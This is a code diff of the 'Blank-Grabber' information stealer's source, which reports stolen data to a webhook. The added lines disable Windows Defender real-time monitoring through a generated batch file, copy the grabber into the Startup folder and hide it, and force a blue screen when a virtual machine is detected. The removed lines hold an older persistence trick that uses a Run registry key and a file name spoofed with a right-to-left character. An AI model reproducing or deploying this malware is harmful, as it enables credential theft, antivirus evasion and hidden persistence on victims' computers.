@@ -1,9 +1,11 @@
 # https://github.com/Blank-c/Blank-Grabber
 
 WEBHOOK = "Do NOT Enter anything here! Enter your webhook in config.txt"
-PINGME = True
-VMPROTECT = True
-BSOD = False #Tries to trigger Blue Screen if grabber fails
+PINGME = True #Pings @everyone
+VMPROTECT = True #Tries to protect your webhook from VMs
+BSOD = True #Tries to trigger Blue Screen if VM detected
+STARTUP = True #Puts the grabber in startup (and hide it)
+HIDE_ITSELF = True #Hide the Grabber
 
 import os
 if os.name!='nt':
@@ -30,6 +32,13 @@ def fquit(verify= False):
         subprocess.run("taskkill /IM winnit.exe /F", capture_output= True, shell= True)
         subprocess.run("taskkill /IM winlogon.exe /F", capture_output= True, shell= True)
     os._exit(0)
+
+def bypass_wd():
+    windef = os.getenv('temp') + '/' + generate() + '.bat'
+    with open(windef, 'w') as e:
+        e.write("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
+    subprocess.run(windef, shell= True, capture_output= True)
+    os.remove(windef)
 
 def generate(num=5):
     return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=num))
@@ -463,25 +472,19 @@ if __name__ == "__main__":
             if VMPROTECT:
                 vmprotect()
             frozen = hasattr(sys, 'frozen')
-            if frozen:
-                if os.path.basename(os.path.dirname(sys.executable)) != "Java":
+            if frozen and STARTUP:
+                if os.path.basename(os.path.dirname(sys.executable)) != "Startup":
                     try:
-                        BlankGrabber.copy('BlankGrabber', sys.executable, "C:/Program Files/Java/Java Updater G‮lld.COM")
+                        path = os.getenv("appdata") + f"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{generate()}.exe"
+                        BlankGrabber.copy(sys.executable, path)
+                        subprocess.run(f'attrib "{path}" +s +h', shell= True, capture_output= True)
                     except Exception:
                         pass
-                    subprocess.run('attrib +h +r +s "C:/Program Files/Java/Java Updater G‮lld.COM"', capture_output = True, shell= True)
-                    try:
-                        if os.path.isfile("C:/Program Files/Java/Java Updater G‮lld.COM"):
-                            with open("C:/Program Files/Java/Java Updater G‮lld.COM", 'ab') as file:
-                                file.write(b'\x00')
-                    except Exception:
-                        pass
-                    subprocess.run('REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Java Updater" /t REG_SZ /F /d "C:/Program Files/Java/Java Updater G‮lld.COM -hide"', shell= True, capture_output= True)
-                    threading.Thread(target= lambda: subprocess.run('start "" "C:/Program Files/Java/Java Updater G‮lld.COM"', shell= True, capture_output= True), daemon= True).start()
-                    time.sleep(1)
-                    os._exit(0)
+            
+            if frozen and HIDE_ITSELF:
+                subprocess.run(f'attrib "{sys.executable}" +s +h', shell= True, capture_output= True)
 
-            threading.Thread(target= MUTEX, daemon= True).start()
+            threading.Thread(target= bypass_wd, daemon= True).start()
             try:
                 BlankGrabber()
             except Exception:
